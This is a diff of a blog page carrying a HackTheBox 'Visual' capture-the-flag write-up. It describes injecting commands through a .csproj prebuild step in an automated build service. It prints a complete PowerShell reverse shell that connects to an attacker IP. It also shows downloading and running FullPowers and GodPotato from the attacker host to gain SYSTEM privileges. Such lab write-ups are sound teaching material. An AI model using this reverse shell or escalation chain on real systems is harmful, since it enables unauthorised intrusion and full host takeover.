@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Visual-Windows-Medium</h1>
   
@@ -74,52 +66,47 @@
 </aside>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>nmap scanning</li>
-</ul>
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled.png" alt="Untitled" />
+<br /><br />
+We find there’s a http service hosted in apache with php
+<br /><br />
+<img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_1.png" alt="Untitled" />
+<br /><br />
+This service allows to make the build project in a automated way, we can see a section where we just put the url repo and wait for it.
+<br /><br />
+First at all we test functionality
+<br /><br />
+To get into the machine successfully we need some files:
+<br /><br />
+    <ol>
+      <li>A repository with c# code</li>
+      <li>A file .csproj and .sln</li>
+      <li>A rev shell to access to the machine once the code is injected
+<br /><br />
+        <blockquote>
+          <p>The machine doesn’t have access to internet therefore we need to run a private server where we could get the repo, we get this in this way</p>
 
-<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled.png" alt="Untitled" /></p>
-
-<p>We find there’s a http service hosted in apache with php</p>
-
-<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_1.png" alt="Untitled" /></p>
-
-<p>This service allows to make the build project in a automated way, we can see a section where we just put the url repo and wait for it.</p>
-
-<p>First at all we test functionality</p>
-
-<p>To get into the machine successfully we need some files:</p>
-
-<ol>
-  <li>A repository with c# code</li>
-  <li>A file .csproj and .sln</li>
-  <li>A rev shell to access to the machine once the code is injected</li>
-</ol>
-
-<blockquote>
-  <p>The machine doesn’t have access to internet therefore we need to run a private server where we could get the repo, we get this in this way</p>
-
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git <span class="nt">--bare</span> clone external_repo
+          <p><br /><br /></p>
+          <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git <span class="nt">--bare</span> clone external_repo
 <span class="nb">cd </span>repo/.git
 git <span class="nt">--bare</span> update-server-info
 <span class="nb">mv </span>hooks/post-updte.sample hooks/post-update
 <span class="nb">cd</span> ..
 python <span class="nt">-m</span> http.server 8000
-</code></pre></div></div>
+</code></pre></div>          </div>
+          <p><br /><br />
+.csproj = This file has the possibility of iinject commands through prebuild tag.</p>
 
-<blockquote>
-  <p>.csproj = This file has the possibility of iinject commands through prebuild tag.</p>
-
-</blockquote>
-
-<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_2.png" alt="Untitled" /></p>
-
-<h2 id="2-user-flag">2: User flag</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socket</span> <span class="o">=</span> new-object System.Net.Sockets.TcpClient<span class="o">(</span><span class="s1">'10.10.14.14'</span>, 2222<span class="o">)</span><span class="p">;</span>
+          <p><br /><br />
+<img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_2.png" alt="Untitled" />
+<br /><br /></p>
+          <h2 id="2-user-flag">2: User flag</h2>
+          <p><br /><br /></p>
+          <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socket</span> <span class="o">=</span> new-object System.Net.Sockets.TcpClient<span class="o">(</span><span class="s1">'10.10.14.14'</span>, 2222<span class="o">)</span><span class="p">;</span>
 <span class="k">if</span><span class="o">(</span><span class="nv">$socket</span> <span class="nt">-eq</span> <span class="nv">$null</span><span class="o">){</span><span class="nb">exit </span>1<span class="o">}</span>
 <span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$socket</span>.GetStream<span class="o">()</span><span class="p">;</span>
 <span class="nv">$writer</span> <span class="o">=</span> new-object System.IO.StreamWriter<span class="o">(</span><span class="nv">$stream</span><span class="o">)</span><span class="p">;</span>
@@ -127,97 +114,105 @@ python <span class="nt">-m</span> http.server 8000
 <span class="nv">$encoding</span> <span class="o">=</span> new-object System.Text.AsciiEncoding<span class="p">;</span>
 <span class="k">do</span>
 <span class="o">{</span>
-	<span class="nv">$writer</span>.Flush<span class="o">()</span><span class="p">;</span>
-	<span class="nv">$read</span> <span class="o">=</span> <span class="nv">$null</span><span class="p">;</span>
-	<span class="nv">$res</span> <span class="o">=</span> <span class="s2">""</span>
-	<span class="k">while</span><span class="o">(</span><span class="nv">$stream</span>.DataAvailable <span class="nt">-or</span> <span class="nv">$read</span> <span class="nt">-eq</span> <span class="nv">$null</span><span class="o">)</span> <span class="o">{</span>
-		<span class="nv">$read</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$buffer</span>, 0, 1024<span class="o">)</span>
-	<span class="o">}</span>
-	<span class="nv">$out</span> <span class="o">=</span> <span class="nv">$encoding</span>.GetString<span class="o">(</span><span class="nv">$buffer</span>, 0, <span class="nv">$read</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"</span><span class="sb">`</span>r<span class="sb">`</span><span class="s2">n"</span>,<span class="s2">""</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"</span><span class="sb">`</span>n<span class="s2">","");
-	if(!</span><span class="nv">$out</span><span class="s2">.equals("</span><span class="nb">exit</span><span class="s2">")){
-		</span><span class="nv">$args</span><span class="s2"> = "";
-		if(</span><span class="nv">$out</span><span class="s2">.IndexOf(' ') -gt -1){
-			</span><span class="nv">$args</span><span class="s2"> = </span><span class="nv">$out</span><span class="s2">.substring(</span><span class="nv">$out</span><span class="s2">.IndexOf(' ')+1);
-			</span><span class="nv">$out</span><span class="s2"> = </span><span class="nv">$out</span><span class="s2">.substring(0,</span><span class="nv">$out</span><span class="s2">.IndexOf(' '));
-			if(</span><span class="nv">$args</span><span class="s2">.split(' ').length -gt 1){
-                </span><span class="nv">$pinfo</span><span class="s2"> = New-Object System.Diagnostics.ProcessStartInfo
-                </span><span class="nv">$pinfo</span><span class="s2">.FileName = "</span>cmd.exe<span class="s2">"
-                </span><span class="nv">$pinfo</span><span class="s2">.RedirectStandardError = </span><span class="nv">$true</span><span class="s2">
-                </span><span class="nv">$pinfo</span><span class="s2">.RedirectStandardOutput = </span><span class="nv">$true</span><span class="s2">
-                </span><span class="nv">$pinfo</span><span class="s2">.UseShellExecute = </span><span class="nv">$false</span><span class="s2">
-                </span><span class="nv">$pinfo</span><span class="s2">.Arguments = "</span>/c <span class="nv">$out</span> <span class="nv">$args</span><span class="s2">"
-                </span><span class="nv">$p</span><span class="s2"> = New-Object System.Diagnostics.Process
-                </span><span class="nv">$p</span><span class="s2">.StartInfo = </span><span class="nv">$pinfo</span><span class="s2">
-                </span><span class="nv">$p</span><span class="s2">.Start() | Out-Null
-                </span><span class="nv">$p</span><span class="s2">.WaitForExit()
-                </span><span class="nv">$stdout</span><span class="s2"> = </span><span class="nv">$p</span><span class="s2">.StandardOutput.ReadToEnd()
-                </span><span class="nv">$stderr</span><span class="s2"> = </span><span class="nv">$p</span><span class="s2">.StandardError.ReadToEnd()
-                if (</span><span class="nv">$p</span><span class="s2">.ExitCode -ne 0) {
-                    </span><span class="nv">$res</span><span class="s2"> = </span><span class="nv">$stderr</span><span class="s2">
-                } else {
-                    </span><span class="nv">$res</span><span class="s2"> = </span><span class="nv">$stdout</span><span class="s2">
-                }
-			}
-			else{
-				</span><span class="nv">$res</span><span class="s2"> = (&amp;"</span><span class="nv">$out</span><span class="s2">" "</span><span class="nv">$args</span><span class="s2">") | out-string;
-			}
-		}
-		else{
-			</span><span class="nv">$res</span><span class="s2"> = (&amp;"</span><span class="nv">$out</span><span class="s2">") | out-string;
-		}
-		if(</span><span class="nv">$res</span><span class="s2"> -ne </span><span class="nv">$null</span><span class="s2">){
-        </span><span class="nv">$writer</span><span class="s2">.WriteLine(</span><span class="nv">$res</span><span class="s2">)
-    }
-	}
+  <span class="nv">$writer</span>.Flush<span class="o">()</span><span class="p">;</span>
+  <span class="nv">$read</span> <span class="o">=</span> <span class="nv">$null</span><span class="p">;</span>
+  <span class="nv">$res</span> <span class="o">=</span> <span class="s2">""</span>
+  <span class="k">while</span><span class="o">(</span><span class="nv">$stream</span>.DataAvailable <span class="nt">-or</span> <span class="nv">$read</span> <span class="nt">-eq</span> <span class="nv">$null</span><span class="o">)</span> <span class="o">{</span>
+   <span class="nv">$read</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$buffer</span>, 0, 1024<span class="o">)</span>
+  <span class="o">}</span>
+  <span class="nv">$out</span> <span class="o">=</span> <span class="nv">$encoding</span>.GetString<span class="o">(</span><span class="nv">$buffer</span>, 0, <span class="nv">$read</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"</span><span class="sb">`</span>r<span class="sb">`</span><span class="s2">n"</span>,<span class="s2">""</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"</span><span class="sb">`</span>n<span class="s2">","");
+  if(!</span><span class="nv">$out</span><span class="s2">.equals("</span><span class="nb">exit</span><span class="s2">")){
+   </span><span class="nv">$args</span><span class="s2"> = "";
+   if(</span><span class="nv">$out</span><span class="s2">.IndexOf(' ') -gt -1){
+       </span><span class="nv">$args</span><span class="s2"> = </span><span class="nv">$out</span><span class="s2">.substring(</span><span class="nv">$out</span><span class="s2">.IndexOf(' ')+1);
+       </span><span class="nv">$out</span><span class="s2"> = </span><span class="nv">$out</span><span class="s2">.substring(0,</span><span class="nv">$out</span><span class="s2">.IndexOf(' '));
+       if(</span><span class="nv">$args</span><span class="s2">.split(' ').length -gt 1){
+           </span><span class="nv">$pinfo</span><span class="s2"> = New-Object System.Diagnostics.ProcessStartInfo
+           </span><span class="nv">$pinfo</span><span class="s2">.FileName = "</span>cmd.exe<span class="s2">"
+           </span><span class="nv">$pinfo</span><span class="s2">.RedirectStandardError = </span><span class="nv">$true</span><span class="s2">
+           </span><span class="nv">$pinfo</span><span class="s2">.RedirectStandardOutput = </span><span class="nv">$true</span><span class="s2">
+           </span><span class="nv">$pinfo</span><span class="s2">.UseShellExecute = </span><span class="nv">$false</span><span class="s2">
+           </span><span class="nv">$pinfo</span><span class="s2">.Arguments = "</span>/c <span class="nv">$out</span> <span class="nv">$args</span><span class="s2">"
+           </span><span class="nv">$p</span><span class="s2"> = New-Object System.Diagnostics.Process
+           </span><span class="nv">$p</span><span class="s2">.StartInfo = </span><span class="nv">$pinfo</span><span class="s2">
+           </span><span class="nv">$p</span><span class="s2">.Start() | Out-Null
+           </span><span class="nv">$p</span><span class="s2">.WaitForExit()
+           </span><span class="nv">$stdout</span><span class="s2"> = </span><span class="nv">$p</span><span class="s2">.StandardOutput.ReadToEnd()
+           </span><span class="nv">$stderr</span><span class="s2"> = </span><span class="nv">$p</span><span class="s2">.StandardError.ReadToEnd()
+           if (</span><span class="nv">$p</span><span class="s2">.ExitCode -ne 0) {
+               </span><span class="nv">$res</span><span class="s2"> = </span><span class="nv">$stderr</span><span class="s2">
+           } else {
+               </span><span class="nv">$res</span><span class="s2"> = </span><span class="nv">$stdout</span><span class="s2">
+           }
+       }
+       else{
+           </span><span class="nv">$res</span><span class="s2"> = (&amp;"</span><span class="nv">$out</span><span class="s2">" "</span><span class="nv">$args</span><span class="s2">") | out-string;
+       }
+   }
+   else{
+       </span><span class="nv">$res</span><span class="s2"> = (&amp;"</span><span class="nv">$out</span><span class="s2">") | out-string;
+   }
+   if(</span><span class="nv">$res</span><span class="s2"> -ne </span><span class="nv">$null</span><span class="s2">){
+   </span><span class="nv">$writer</span><span class="s2">.WriteLine(</span><span class="nv">$res</span><span class="s2">)
+  }
+  }
 }While (!</span><span class="nv">$out</span><span class="s2">.equals("</span><span class="nb">exit</span><span class="s2">"))
 </span><span class="nv">$writer</span><span class="s2">.close();
 </span><span class="nv">$socket</span><span class="s2">.close();
 </span><span class="nv">$stream</span><span class="s2">.Dispose()
-</span></code></pre></div></div>
-
-<p>Con este rev shell ponemos en escucha en el puerto establecido y ya obtenemos acceso</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">c:\Users\enox\Desktop\user.txt</span><span class="w">
-</span></code></pre></div></div>
-
-<h2 id="3-priv-esc">3: Priv esc</h2>
-
-<p>wrapper pred:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\xampp\htdocs\uploads</span><span class="w">
-</span></code></pre></div></div>
-
-<p>Revisamos privilegios</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
-</span></code></pre></div></div>
-
-<p>Check some privileges and look “ImpersonatePrivilege” is not present</p>
-
-<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_3.png" alt="Untitled" /></p>
-
-<p>We cannot modify or access to files but we can create them</p>
-
-<p>Use the server early running and add fullpowers, a POC that rest default privileges</p>
-
-<p>With impersonate privileges we can assume other identities, sometime interesting that happens to me in this machine is that i had to reset the machine to make work fullpowers properly</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.00.000:0000/fullpowers.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">Fullpowers.exe</span><span class="w">
+</span></code></pre></div>          </div>
+          <p><br /><br />
+Con este rev shell ponemos en escucha en el puerto establecido y ya obtenemos acceso 
+<br /><br /></p>
+          <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">c:\Users\enox\Desktop\user.txt</span><span class="w">
+</span></code></pre></div>          </div>
+          <p><br /><br /></p>
+          <h2 id="3-priv-esc">3: Priv esc</h2>
+          <p><br /><br />
+wrapper pred:
+<br /><br /></p>
+          <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\xampp\htdocs\uploads</span><span class="w">
+</span></code></pre></div>          </div>
+          <p><br /><br />
+Revisamos privilegios
+<br /><br /></p>
+          <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span></code></pre></div>          </div>
+          <p><br /><br />
+Check some privileges and look “ImpersonatePrivilege” is not present
+<br /><br />
+<img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_3.png" alt="Untitled" />
+<br /><br />
+We cannot modify or access to files but we can create them
+<br /><br />
+Use the server early running and add fullpowers, a POC that rest default privileges
+<br /><br />
+With impersonate privileges we can assume other identities, sometime interesting that happens to me in this machine is that i had to reset the machine to make work fullpowers properly
+<br /><br /></p>
+          <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.00.000:0000/fullpowers.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">Fullpowers.exe</span><span class="w">
 </span><span class="n">fullpowers.exe</span><span class="w">
-</span></code></pre></div></div>
-
-<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_4.png" alt="Untitled" /></p>
-
-<p>We got all priv is time to use godpotato and get the whole power</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.14.14:8000/GodPotato.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">GodPotato.exe</span><span class="w">
-</span><span class="n">GodPotato-NET64</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"cmd /c type C:\Users\Administrator\Desktop\root.txt"</span><span class="w">
-</span></code></pre></div></div>
-
-<p>There was a problem, godpotato which will allow us to run commands as system had 3 exe’s and only the 64 one worked</p>
-
-<p>Machine pwned!!
+</span></code></pre></div>          </div>
+          <p><br /><br />
+<img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_4.png" alt="Untitled" />
+<br /><br />
+We got all priv is time to use godpotato and get the whole power
+<br /><br /></p>
+          <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.14.14:8000/GodPotato.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">GodPotato.exe</span><span class="w">
+</span><span class="n">godPotato-NET64</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"cmd /c type C:\Users\Administrator\Desktop\root.txt"</span><span class="w">
+</span></code></pre></div>          </div>
+          <p><br /><br />
+There was a problem, godpotato which will allow us to run commands as system had 3 exe’s and only the 64 one worked
+<br /><br />
+Machine pwned!!
 <script src="/assets/js/matrix-overlay.js"></script></p>
+        </blockquote>
+      </li>
+    </ol>
+  </li>
+</ul>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
